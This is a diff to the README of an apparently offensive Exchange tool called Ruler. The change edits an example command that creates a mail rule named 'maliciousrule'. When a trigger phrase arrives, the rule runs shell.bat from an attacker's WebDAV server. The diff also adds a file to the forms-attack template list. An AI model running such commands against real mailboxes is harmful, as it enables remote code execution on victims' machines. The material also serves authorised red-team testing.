@@ -238,7 +238,7 @@ go run webdavserv.go -d /path/to/directory/to/serve
 To create the new rule user Ruler and:
 
 ```
-./ruler --email user@targetdomain.com --username username add --location "\\\\yourserver\\webdav\\shell.bat" --trigger "pop a shell" --name maliciousrule
+./ruler --email user@targetdomain.com --username username add --location "\\\\yourserver\\webdav\\shell.bat" --trigger "popashell" --name maliciousrule
 ```
 
 The various parts:
@@ -319,6 +319,7 @@ If you use the forms attack, you need to ensure that the **templates** folder is
 * img0.bin
 * img1.bin
 * formstemplate.bin
+* formsdeletetemplate.bin
 
 ## Using forms
 
